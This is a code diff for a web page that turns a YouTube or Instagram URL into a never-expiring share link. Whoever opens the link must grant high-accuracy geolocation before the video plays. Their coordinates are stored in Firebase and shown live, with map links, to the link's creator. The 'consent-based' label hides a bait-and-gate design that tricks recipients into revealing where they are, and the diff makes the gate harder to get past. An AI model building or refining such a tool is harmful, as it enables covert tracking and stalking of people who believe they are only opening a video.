@@ -15,7 +15,7 @@
     body {
       margin: 0;
       font-family: system-ui, -apple-system, BlinkMacSystemFont,
-        Segoe UI, Roboto, Arial, sans-serif;
+        "Segoe UI", Roboto, Arial, sans-serif;
       background: #f3f6fb;
       color: #172033;
     }
@@ -29,7 +29,7 @@
       background: #fff;
       padding: 24px;
       border-radius: 18px;
-      box-shadow: 0 8px 30px rgba(0, 0, 0, .1);
+      box-shadow: 0 8px 30px rgba(0, 0, 0, .10);
       margin-bottom: 18px;
     }
 
@@ -66,10 +66,6 @@
       margin-top: 7px;
     }
 
-    button:hover {
-      background: #1252b3;
-    }
-
     button:disabled {
       opacity: .55;
       cursor: not-allowed;
@@ -77,10 +73,6 @@
 
     .secondary {
       background: #333;
-    }
-
-    .secondary:hover {
-      background: #222;
     }
 
     .small {
@@ -127,15 +119,27 @@
     .success-msg {
       color: #1b7e36;
     }
+
+    .map-button {
+      display: block;
+      width: 100%;
+      text-align: center;
+      background: #1769e0;
+      color: white;
+      padding: 12px;
+      border-radius: 10px;
+      text-decoration: none;
+      font-weight: 600;
+      margin-top: 10px;
+    }
   </style>
 </head>
-
 
 <body>
 
   <div class="wrap">
 
-    <!-- ================= CREATOR VIEW ================= -->
+    <!-- ================= CREATOR ================= -->
 
     <section id="creator" class="card">
 
@@ -145,30 +149,23 @@
         Create a consent-based location-sharing link for a trusted person.
       </p>
 
-
       <label for="videoUrl">
         YouTube / Instagram Video URL
       </label>
 
       <input id="videoUrl" type="url" placeholder="https://www.youtube.com/watch?v=..." autocomplete="off">
 
-
       <button id="generate">
         Generate Share Link
       </button>
 
-
       <div id="creatorStatus" class="status small"></div>
-
 
       <div id="generated" class="result hidden">
 
-        <strong>
-          Share Link Generated:
-        </strong>
+        <strong>Share Link Generated:</strong>
 
         <p id="shareLink" style="font-weight:bold;margin:8px 0"></p>
-
 
         <button id="copy" class="secondary">
           Copy Link
@@ -176,30 +173,28 @@
 
       </div>
 
-
       <h2 style="margin-top:28px">
         📍 Received Locations
       </h2>
 
-
       <div id="locations">
-
         <p class="small">
           No location received yet.
         </p>
-
       </div>
 
     </section>
 
 
-    <!-- ================= TRUSTED PERSON VIEW ================= -->
+    <!-- ================= TRUSTED PERSON ================= -->
 
     <section id="trusted" class="card hidden">
 
-      <h1>
-        Continue to Video
-      </h1>
+      <h1>📍 Location Access</h1>
+
+      <p class="small">
+        Location access is required to continue to the video.
+      </p>
 
       <div id="trustedStatus" class="status small">
         Checking share link...
@@ -210,17 +205,14 @@
   </div>
 
 
-
   <script type="module">
 
-
-    /* =========================================================
-       FIREBASE IMPORT
-       ========================================================= */
+    /* =====================================================
+       FIREBASE
+       ===================================================== */
 
     import { initializeApp }
       from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
-
 
     import {
       getDatabase,
@@ -232,11 +224,6 @@
     }
       from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";
 
-
-
-    /* =========================================================
-       FIREBASE CONFIGURATION
-       ========================================================= */
 
     const firebaseConfig = {
 
@@ -269,85 +256,71 @@
     const app =
       initializeApp(firebaseConfig);
 
-
     const db =
       getDatabase(app);
 
 
-
-    /* =========================================================
-       BASIC HELPERS
-       ========================================================= */
+    /* =====================================================
+       HELPERS
+       ===================================================== */
 
     const $ =
       id => document.getElementById(id);
 
-
     const params =
-      new URLSearchParams(
-        window.location.search
-      );
-
+      new URLSearchParams(window.location.search);
 
     const shareId =
       params.get("share");
 
-
     const creator =
       $("creator");
-
 
     const trusted =
       $("trusted");
 
 
-
-    /* =========================================================
+    /* =====================================================
        RANDOM ID
-       ========================================================= */
+       ===================================================== */
 
     function randomId() {
 
       const chars =
         "ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz23456789";
 
-      let s = "";
-
+      let id = "";
 
       for (let i = 0; i < 12; i++) {
 
-        s +=
+        id +=
           chars[
           Math.floor(
-            Math.random() *
-            chars.length
+            Math.random() * chars.length
           )
           ];
 
       }
 
-
-      return s;
+      return id;
     }
 
 
-
-    /* =========================================================
+    /* =====================================================
        VIDEO URL VALIDATION
-       ========================================================= */
+       ===================================================== */
 
     function validVideoUrl(value) {
 
       try {
 
-        const u =
+        const url =
           new URL(value);
 
-
         return (
-          u.protocol === "https:" &&
+          url.protocol === "https:" &&
           /(^|\.)youtube\.com$|(^|\.)youtu\.be$|(^|\.)instagram\.com$/i
-            .test(u.hostname)
+            .test(url.hostname)
         );
 
       } catch {
@@ -358,29 +331,22 @@
     }
 
 
-
-    /* =========================================================
+    /* =====================================================
        CREATOR MODE
-       ========================================================= */
+       ===================================================== */
 
     if (!shareId) {
-
-
-      /* ================= GENERATE LINK ================= */
 
       $("generate")
         .addEventListener(
           "click",
           async () => {
 
-
             const videoUrl =
               $("videoUrl")
                 .value
                 .trim();
 
-
-            /* Validate video URL */
 
             if (!validVideoUrl(videoUrl)) {
 
@@ -401,12 +367,9 @@
             $("creatorStatus").className =
               "status small";
 
-
             $("creatorStatus").textContent =
-              "Creating link...";
+              "Creating share link...";
 
-
-            /* Create unique ID */
 
             const id =
               randomId();
@@ -414,20 +377,13 @@
 
             try {
 
-
               /*
-               * No expiry time.
-               *
-               * Link will remain active
-               * until the Firebase share entry
-               * is deleted.
+               * NO EXPIRY
                */
 
               const createdAt =
                 Date.now();
 
-
-              /* Save share */
 
               await set(
                 ref(
@@ -435,7 +391,6 @@
                   "shares/" + id
                 ),
                 {
-
                   videoUrl:
                     videoUrl,
 
@@ -444,12 +399,9 @@
 
                   status:
                     "waiting"
-
                 }
               );
 
-
-              /* Create share URL */
 
               const link =
                 window.location.origin +
@@ -458,8 +410,7 @@
                 encodeURIComponent(id);
 
 
-              $("shareLink")
-                .textContent =
+              $("shareLink").textContent =
                 link;
 
 
@@ -473,25 +424,21 @@
 
 
               $("creatorStatus").textContent =
-                "Share link created successfully. This link has no time limit.";
+                "Share link created. No automatic expiry.";
 
-
-              /* Watch location */
 
               watchLocations(id);
 
 
-            } catch (e) {
+            } catch (error) {
 
-              console.error(e);
-
+              console.error(error);
 
               $("creatorStatus").className =
                 "status small error-msg";
 
-
               $("creatorStatus").textContent =
-                "Could not create the link. Check Firebase config or security rules.";
+                "Could not create share link.";
 
             } finally {
 
@@ -504,8 +451,9 @@
         );
 
 
-
-      /* ================= COPY LINK ================= */
+      /* =====================================================
+         COPY
+         ===================================================== */
 
       $("copy")
         .addEventListener(
@@ -518,30 +466,24 @@
                 $("shareLink").textContent
               );
 
-
               $("copy").textContent =
                 "Copied ✓";
 
-
               setTimeout(
                 () => {
-
                   $("copy").textContent =
                     "Copy Link";
-
                 },
                 1500
               );
-
 
             } catch {
 
               $("creatorStatus").className =
                 "status small error-msg";
 
-
               $("creatorStatus").textContent =
-                "Copy failed. Please select and copy the link manually.";
+                "Copy failed. Copy the link manually.";
 
             }
 
@@ -549,9 +491,8 @@
         );
 
 
-
       /* =====================================================
-         WATCH LOCATIONS
+         REAL-TIME LOCATION
          ===================================================== */
 
       function watchLocations(id) {
@@ -562,48 +503,40 @@
             "locations/" + id
           ),
 
-          snap => {
-
+          snapshot => {
 
             const root =
               $("locations");
-
 
             root.innerHTML =
               "";
 
 
-            if (!snap.exists()) {
+            if (!snapshot.exists()) {
 
               root.innerHTML =
-                '<p class="small">No location received yet. Awaiting trusted person consent...</p>';
+                '<p class="small">No location received yet.</p>';
 
               return;
-
             }
 
 
             const entries =
               Object.values(
-                snap.val()
+                snapshot.val()
               ).reverse();
 
 
-            for (
-              const loc
-              of entries
-            ) {
+            for (const loc of entries) {
 
+              const latitude =
+                Number(loc.latitude);
 
-              const box =
-                document.createElement(
-                  "div"
-                );
+              const longitude =
+                Number(loc.longitude);
 
-
-              box.className =
-                "item";
-
+              const accuracy =
+                Number(loc.accuracy);
 
               const time =
                 new Date(
@@ -612,12 +545,18 @@
 
 
               const mapUrl =
-                `https://www.google.com/maps?q=${encodeURIComponent(
-                  loc.latitude +
-                  "," +
-                  loc.longitude
-                )
-                }`;
+                "https://www.google.com/maps/search/?api=1&query=" +
+                encodeURIComponent(
+                  `${latitude},${longitude}`
+                );
+
+
+              const box =
+                document.createElement("div");
+
+
+              box.className =
+                "item";
 
 
               box.innerHTML = `
@@ -626,31 +565,20 @@
                   📍 Location Received
                 </strong>
 
-                <p
-                  class="small"
-                  style="margin:8px 0"
-                >
+                <p class="small">
 
                   <strong>Latitude:</strong>
-                  ${Number(
-                loc.latitude
-              ).toFixed(6)}
+                  ${latitude.toFixed(6)}
 
                   <br>
 
                   <strong>Longitude:</strong>
-                  ${Number(
-                loc.longitude
-              ).toFixed(6)}
+                  ${longitude.toFixed(6)}
 
                   <br>
 
                   <strong>Accuracy:</strong>
-                  ~${Math.round(
-                Number(
-                  loc.accuracy
-                )
-              )} meters
+                  ~${Math.round(accuracy)} meters
 
                   <br>
 
@@ -659,21 +587,19 @@
 
                 </p>
 
-
                 <a
+                  class="map-button"
                   href="${mapUrl}"
                   target="_blank"
-                  rel="noopener"
+                  rel="noopener noreferrer"
                 >
-                  View on Google Maps ↗
+                  🗺️ Open Location in Google Maps
                 </a>
 
               `;
 
 
-              root.appendChild(
-                box
-              );
+              root.appendChild(box);
 
             }
 
@@ -685,22 +611,15 @@
     }
 
 
-
-    /* =========================================================
+    /* =====================================================
        TRUSTED PERSON MODE
-       ========================================================= */
+       ===================================================== */
 
     if (shareId) {
-
-
-      /* Hide creator */
 
       creator.classList.add(
         "hidden"
       );
-
-
-      /* Show trusted */
 
       trusted.classList.remove(
         "hidden"
@@ -711,7 +630,6 @@
         null;
 
 
-
       /* =====================================================
          LOAD SHARE
          ===================================================== */
@@ -720,8 +638,7 @@
 
         try {
 
-
-          const snap =
+          const snapshot =
             await get(
               ref(
                 db,
@@ -731,134 +648,149 @@
             );
 
 
-          /* Link doesn't exist */
+          /*
+           * Link manually deleted/closed
+           */
 
-          if (!snap.exists()) {
+          if (!snapshot.exists()) {
 
             $("trustedStatus").className =
               "status small error-msg";
-
 
             $("trustedStatus").textContent =
               "This share link is invalid or closed.";
 
             return;
-
           }
 
 
-          /* Get share data */
-
           shareData =
-            snap.val();
+            snapshot.val();
 
 
           $("trustedStatus").className =
             "status small";
 
-
           $("trustedStatus").textContent =
-            "Requesting location permission...";
+            "Requesting location access...";
 
 
           /*
-           * Automatically request location.
-           *
-           * Browser will show its own
-           * permission prompt.
+           * Start native browser geolocation.
            */
 
           requestLocation();
 
 
-        } catch (e) {
+        } catch (error) {
 
-          console.error(e);
-
+          console.error(error);
 
           $("trustedStatus").className =
             "status small error-msg";
 
-
           $("trustedStatus").textContent =
-            "Could not load link details. Please check your network connection.";
+            "Could not load the share link.";
 
         }
 
       }
 
+
       /* =====================================================
-         REQUEST LOCATION
+         LOCATION REQUEST
          ===================================================== */
 
       function requestLocation() {
 
-
         if (!shareData) {
-
           return;
-
         }
 
-        /* Check browser support */
+
+        /*
+         * Browser does not support geolocation.
+         */
 
         if (!navigator.geolocation) {
 
           $("trustedStatus").className =
             "status small error-msg";
 
-
           $("trustedStatus").textContent =
-            "Geolocation is not supported by your browser.";
+            "Location is not supported by this browser.";
 
           return;
-
         }
+
+
         $("trustedStatus").className =
           "status small";
 
-
         $("trustedStatus").textContent =
-          "Please allow location access in your browser...";
+          "Please allow location access when your device/browser asks.";
 
 
         /*
-         * Browser permission request.
+         * IMPORTANT:
          *
-         * User must press Allow.
+         * This is the REAL browser geolocation API.
+         *
+         * Android/browser controls:
+         * - Turn on Location flow
+         * - Allow / Deny permission
+         *
+         * Website cannot bypass those controls.
          */
 
         navigator.geolocation.getCurrentPosition(
 
-
           /* =================================================
-             SUCCESS
+             LOCATION SUCCESS
              ================================================= */
 
           async position => {
 
+            const latitude =
+              position.coords.latitude;
 
-            const loc = {
+            const longitude =
+              position.coords.longitude;
+
+            const accuracy =
+              position.coords.accuracy;
+
+            const timestamp =
+              Date.now();
+
+
+            const locationData = {
 
               latitude:
-                position.coords.latitude,
+                latitude,
 
               longitude:
-                position.coords.longitude,
+                longitude,
 
               accuracy:
-                position.coords.accuracy,
+                accuracy,
 
               timestamp:
-                Date.now()
-
+                timestamp
             };
-            try {
-              $("trustedStatus").textContent =
-                "Saving location and preparing redirect...";
-              /* Create location record */
 
-              const locRef =
+
+            try {
+
+              $("trustedStatus").textContent =
+                "Location received. Saving...";
+
+
+              /*
+               * Save location
+               */
+
+              const locationRef =
                 push(
                   ref(
                     db,
@@ -866,15 +798,17 @@
                     shareId
                   )
                 );
-              /* Save location */
+
 
               await set(
-                locRef,
-                loc
+                locationRef,
+                locationData
               );
 
 
-              /* Update status */
+              /*
+               * Update status
+               */
 
               await set(
                 ref(
@@ -892,10 +826,14 @@
 
 
               $("trustedStatus").textContent =
-                "Location verified. Redirecting to video now...";
+                "Location verified. Opening video...";
 
 
-              /* Open video */
+              /*
+               * ONLY AFTER LOCATION IS
+               * SUCCESSFULLY SAVED
+               * open the original video.
+               */
 
               setTimeout(
                 () => {
@@ -906,82 +844,119 @@
                 },
                 800
               );
-            } catch (e) {
 
-              console.error(e);
 
+            } catch (error) {
+
+              console.error(error);
+
+
+              /*
+               * If Firebase save fails,
+               * DO NOT open video.
+               */
 
               $("trustedStatus").className =
                 "status small error-msg";
 
-
               $("trustedStatus").textContent =
-                "Failed to save location data to Firebase. Please try again.";
+                "Location could not be saved. Video will not open.";
 
             }
 
           },
+
+
           /* =================================================
-             ERROR
+             LOCATION ERROR
              ================================================= */
 
           error => {
-
 
             $("trustedStatus").className =
               "status small error-msg";
 
 
-            switch (
-            error.code
+            /*
+             * Permission denied
+             */
+
+            if (
+              error.code ===
+              error.PERMISSION_DENIED
             ) {
 
+              $("trustedStatus").textContent =
+                "Location permission was denied. Video will not open.";
 
-              case error.PERMISSION_DENIED:
-
-                $("trustedStatus").textContent =
-                  "Location permission was denied.";
-
-                break;
-
-
-              case error.POSITION_UNAVAILABLE:
-
-                $("trustedStatus").textContent =
-                  "Location is unavailable.";
-
-                break;
-
-
-              case error.TIMEOUT:
-
-                $("trustedStatus").textContent =
-                  "Location request timed out.";
-
-                break;
-
-
-              default:
-
-                $("trustedStatus").textContent =
-                  "Could not get location.";
-
-                break;
-
+              return;
             }
 
+
+            /*
+             * Location/GPS unavailable
+             *
+             * User should manually turn ON
+             * device Location and try again.
+             */
+
+            if (
+              error.code ===
+              error.POSITION_UNAVAILABLE
+            ) {
+
+              $("trustedStatus").textContent =
+                "Device Location is OFF or unavailable. Please turn ON Location on your device, then reopen the link.";
+
+              return;
+            }
+
+
+            /*
+             * Timeout
+             */
+
+            if (
+              error.code ===
+              error.TIMEOUT
+            ) {
+
+              $("trustedStatus").textContent =
+                "Location request timed out. Please turn ON Location and try again.";
+
+              return;
+            }
+
+
+            $("trustedStatus").textContent =
+              "Unable to get your location. Video will not open.";
+
           },
+
+
           /* =================================================
              LOCATION OPTIONS
              ================================================= */
 
           {
 
+            /*
+             * Request best available accuracy.
+             */
+
             enableHighAccuracy:
               true,
 
+            /*
+             * Wait up to 30 seconds.
+             */
+
             timeout:
-              15000,
+              30000,
+
+            /*
+             * Do not use old cached location.
+             */
 
             maximumAge:
               0
@@ -989,9 +964,12 @@
           }
 
         );
+
       }
+
+
       /* =====================================================
-         START AUTOMATICALLY
+         START
          ===================================================== */
 
       loadShare();
